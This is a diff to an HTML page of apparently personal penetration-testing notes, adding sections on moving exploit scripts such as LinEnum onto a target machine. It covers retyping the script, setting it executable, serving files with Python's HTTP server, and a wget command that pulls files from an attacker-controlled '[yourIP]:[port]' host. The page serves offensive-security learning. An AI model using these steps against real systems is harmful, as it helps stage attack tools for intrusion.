@@ -387,8 +387,18 @@
             <nav id="bd-toc-nav" aria-label="Page">
                 <ul class="visible nav section-nav flex-column">
  <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#just-re-make-the-file">
+   Just re-make the file
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
   <a class="reference internal nav-link" href="#python-s-simplehttpserver">
    Python’s SimpleHTTPServer
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#python-s-http-server">
+   Python’s HTTP.Server
   </a>
  </li>
 </ul>
@@ -412,8 +422,18 @@
                         <nav aria-label="Page">
                             <ul class="visible nav section-nav flex-column">
  <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#just-re-make-the-file">
+   Just re-make the file
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
   <a class="reference internal nav-link" href="#python-s-simplehttpserver">
    Python’s SimpleHTTPServer
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#python-s-http-server">
+   Python’s HTTP.Server
   </a>
  </li>
 </ul>
@@ -428,9 +448,31 @@
   <div class="tex2jax_ignore mathjax_ignore section" id="file-transfer-to-machines">
 <h1>File Transfer to Machines<a class="headerlink" href="#file-transfer-to-machines" title="Permalink to this headline">¶</a></h1>
 <p>Ok, so you have this great exploit that you can push to a target machine. You even have a low privelige users who can put the file for you. Now the question becomes; “how do I get my file to the remote machine”? As is rather standard with this sort of stuff, the answer is “Many ways”.</p>
+<div class="section" id="just-re-make-the-file">
+<h2>Just re-make the file<a class="headerlink" href="#just-re-make-the-file" title="Permalink to this headline">¶</a></h2>
+<p>So this one is often overlooked, but with script files it’s probably the easiest method. Simply create a blank file on the target machine and write your script to the file (naturally this only works for scripts). An example of this would be transfering LinEnum to a machine by writing the file with nano or vi. <br>
+Remember to change the script to have execute permissions when you’re done.</p>
+<blockquote>
+<div><p>chmod +x [file]</p>
+</div></blockquote>
+<hr>
+</div>
 <div class="section" id="python-s-simplehttpserver">
 <h2>Python’s SimpleHTTPServer<a class="headerlink" href="#python-s-simplehttpserver" title="Permalink to this headline">¶</a></h2>
+<p>Like it says on the box, a simple http server you can host locally for a remote machine to connect to. On your local machine, create a folder that you want to host files from. In that folder, run the below command.</p>
 <p><img alt="JrPen-FileInclusion_PythonServer.png" src="../_images/JrPen-FileInclusion_PythonServer.png" /></p>
+<p>You can the pull files using wget (as long as the target is routable to you).</p>
+<blockquote>
+<div><p>wget ‘http://[yourIP]:[port]/[file.ext]’</p>
+</div></blockquote>
+<hr>
+</div>
+<div class="section" id="python-s-http-server">
+<h2>Python’s HTTP.Server<a class="headerlink" href="#python-s-http-server" title="Permalink to this headline">¶</a></h2>
+<p>Basically the same as above, but for python3. The below hosts on port 8888</p>
+<blockquote>
+<div><p>python3 -m http.server 8888</p>
+</div></blockquote>
 </div>
 </div>
 
